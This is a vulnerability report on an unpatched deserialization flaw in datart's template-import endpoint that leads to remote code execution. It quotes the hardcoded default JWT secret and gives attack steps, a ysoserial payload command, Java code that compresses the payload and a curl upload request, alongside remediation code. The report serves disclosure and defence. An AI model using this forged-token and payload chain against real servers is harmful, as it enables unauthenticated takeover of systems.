# CVE Vulnerability Report: datart `/api/v1/viz/import/template` Java Native Deserialization RCE

> **Status**: CVE pending | **Type**: 0-day vulnerability | **Severity**: 🔴 Critical

---

## 1. Summary

| Field | Value |
|:------|:------|
| **Vulnerability Name** | datart `/api/v1/viz/import/template` Java Native Deserialization Remote Code Execution |
| **CVE ID** | Pending |
| **Vulnerability Type** | CWE-502: Deserialization of Untrusted Data |
| **Severity** | 🔴 Critical |
| **CVSS 3.1 Score** | **9.8** (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **Affected Versions** | datart <= 1.0.0-rc.3 (all historical versions) |
| **Discovery Date** | 2026-06-14 |
| **Vulnerability Status** | Unpatched, not publicly disclosed |

---

## 2. Description

The template import functionality in datart (an open-source data visualization platform) contains a Java native deserialization vulnerability. The `VizServiceImpl.extractModel()` method uses `ObjectInputStream.readObject()` to directly deserialize user-uploaded GZIP-compressed files without any class whitelist or blacklist validation. An attacker can craft a malicious serialization payload to trigger arbitrary class instantiation on the server, and achieve remote code execution (RCE) by leveraging gadget chains present in the classpath.

---

## 3. Scope of Impact

| Dimension | Scope |
|:----------|:------|
| **Affected Component** | server module, `VizServiceImpl.extractModel()` method |
| **Affected Route** | `POST /api/v1/viz/import/template` |
| **Attack Complexity** | Low — only requires uploading a GZIP-compressed serialized file |
| **Authentication Required** | Yes, login required (⚠️ but JWT Secret default value `d@a$t%a^r&a*t` is hardcoded and publicly known in the open-source code, allowing token forgery) |
| **Impact of Exploitation** | Remote code execution, full server compromise, data exfiltration, lateral movement |
| **Exploitation Prerequisites** | ① Obtain a valid Token or forge one using the default JWT Secret |
| | ② Upload a malicious GZIP serialized file |
| | ③ Classpath contains usable gadget chains (Fastjson, Commons Collections, etc.) |

---

## 4. Vulnerability Details

### 4.1 Entry Point

**File**: [VizController.java:299-303](server/src/main/java/datart/server/controller/VizController.java#L299-L303)

```java
@ApiOperation(value = "import viz template")
@PostMapping(value = "/import/template")
public ResponseData<Folder> importVizTemplate(
        @RequestParam("file") MultipartFile file,
        @RequestParam String parentId,
        @RequestParam String orgId,
        @RequestParam String name) throws Exception {
    return ResponseData.success(vizService.importVizTemplate(file, orgId, parentId, name));
}
```

- Accepts user-uploaded `MultipartFile` (arbitrary file)
- No file type validation, no extension filtering, no magic number checking
- Authentication: Bearer Token extracted from HTTP Header (JWT-based)

### 4.2 Call Chain

```
POST /api/v1/viz/import/template (MultipartFile file)
  └─ VizController.importVizTemplate()              [VizController.java:301]
      └─ VizServiceImpl.importVizTemplate()          [VizServiceImpl.java:442]
          ├─ folderService.retrieve(parentId)        (optional, parent folder lookup)
          └─ extractModel(file)                      [VizServiceImpl.java:448]  ← DANGEROUS ENTRY
              └─ ObjectInputStream.readObject()      [VizServiceImpl.java:596]  ← SINK
```

### 4.3 Vulnerable Code

**File**: [VizServiceImpl.java:594-598](server/src/main/java/datart/server/service/impl/VizServiceImpl.java#L594-L598)

```java
public TransferModel extractModel(MultipartFile file) throws IOException, ClassNotFoundException {
    try (ObjectInputStream inputStream = new ObjectInputStream(new GZIPInputStream(file.getInputStream()));) {
        return (TransferModel) inputStream.readObject();
    }
}
```

**Security Analysis**:

| Security Issue | Description |
|:---------------|:------------|
| ❌ `ObjectInputStream.readObject()` | Direct deserialization of external input with no class whitelist/blacklist |
| ❌ `GZIPInputStream` decompression | Server automatically decompresses GZIP; attacker needs no encoding workaround |
| ❌ No file type validation | No magic number, extension, or MIME type check on MultipartFile |
| ❌ No size limit | Oversized payloads can cause denial of service |
| ❌ Cast happens after deserialization | `(TransferModel)` cast occurs after `readObject()` completes — cannot prevent gadget execution |

### 4.4 Risk Combination

This vulnerability can be chained with other known security issues in datart to significantly lower the attack barrier:

| Security Issue | File Location | Impact |
|:---------------|:--------------|:-------|
| **Hardcoded JWT Secret** | [Application.java:103](core/src/main/java/datart/core/common/Application.java#L103) | Default key `d@a$t%a^r&a*t` is publicly known in open-source code → arbitrary Token forgery |
| **Fastjson default converter** | WebMvcConfig.java:68-75 | Fastjson 1.2.83 is the default HTTP message converter for all requests |
| **Fastjson autotype** | Same as above | autotype not disabled, potentially bypassable |

Default JWT Secret + Deserialization Entry = **Unauthenticated RCE**.

---

## 5. Attack Scenario

### Scenario: Forge Token via Default JWT Secret to Trigger RCE

```
Step 1: Obtain/Forge Token
  - Read JWT Secret from open-source code: "d@a$t%a^r&a*t"
  - Forge an arbitrary user Token

Step 2: Craft Deserialization Payload
  - Use ysoserial or similar tool to generate a gadget chain payload
  - Example: java -jar ysoserial.jar CommonsCollections1 "calc.exe" > payload.ser

Step 3: GZIP Compression
  - Compress payload.ser with GZIP to produce payload.ser.gz

Step 4: Send Attack Request
  POST /api/v1/viz/import/template
  Headers:
    Authorization: Bearer <forged JWT Token>
    Content-Type: multipart/form-data
  Body:
    file: payload.ser.gz
    parentId: (empty)
    orgId: any-org-id
    name: exploit

Step 5: RCE
  - Server decompresses GZIP → readObject() → gadget chain triggers → arbitrary command execution
```

Test Results:

![](assert/2.png)

![](assert/1.png)

---

## 6. Remediation

### Emergency Fix (Immediate)

**Option 1: Whitelist-based Deserialization (Recommended, minimal change)**

Modify [VizServiceImpl.java:594-598](server/src/main/java/datart/server/service/impl/VizServiceImpl.java#L594-L598):

```java
public TransferModel extractModel(MultipartFile file) throws IOException, ClassNotFoundException {
    try (ObjectInputStream inputStream = new ObjectInputStream(new GZIPInputStream(file.getInputStream())) {
        @Override
        protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
            String name = desc.getName();
            // Whitelist: only allow TransferModel-related classes
            if (!name.startsWith("datart.core.base.transfer.") &&
                !name.startsWith("datart.core.entity.") &&
                !name.startsWith("java.lang.") &&
                !name.startsWith("java.util.")) {
                throw new InvalidClassException("Unexpected serialized class", name);
            }
            return super.resolveClass(desc);
        }
    }) {
        return (TransferModel) inputStream.readObject();
    }
}
```

**Option 2: Replace with JSON Format (Complete fix)**

Replace Java serialization with JSON serialization (Jackson/Fastjson):

```java
public TransferModel extractModel(MultipartFile file) throws IOException {
    // Use JSON instead of Java native serialization
    String json = new String(IOUtils.toByteArray(new GZIPInputStream(file.getInputStream())), StandardCharsets.UTF_8);
    return JSON.parseObject(json, TransferModel.class);
}
```

## 7. Proof of Concept

### PoC Code (Java)

bash:
```bash
java -jar ysoserial.jar CommonsCollections1 "calc.exe" > payload.ser
```

```java
import java.io.*;
import java.util.zip.GZIPOutputStream;

public class Main {
    public static void main(String[] args) throws IOException {
        // 1. Generate payload using ysoserial:
        //    java -jar ysoserial.jar CommonsCollections1 "calc.exe" > payload.ser
        
        // 2. GZIP compression
        try (FileInputStream fis = new FileInputStream("payload.ser");
             FileOutputStream fos = new FileOutputStream("payload.ser.gz");
             GZIPOutputStream gzipOut = new GZIPOutputStream(fos)) {
            byte[] buffer = new byte[1024];
            int len;
            while ((len = fis.read(buffer)) > 0) {
                gzipOut.write(buffer, 0, len);
            }
        }
        
        // 3. Upload via curl:
        // curl -X POST "http://target:8080/api/v1/viz/import/template" \
        //   -H "Authorization: Bearer <token>" \
        //   -F "file=@payload.ser.gz" \
        //   -F "parentId=" \
        //   -F "orgId=test" \
        //   -F "name=exploit"
    }
}
```


## 8. References

- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [ysoserial - Java Deserialization Exploitation Tool](https://github.com/frohoff/ysoserial)
- [OWASP - Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [datart Project Repository](https://github.com/running-elephant/datart)

---

## 9. Disclaimer

This report is intended for security research and defensive security purposes only. Do not test against unauthorized systems.

---
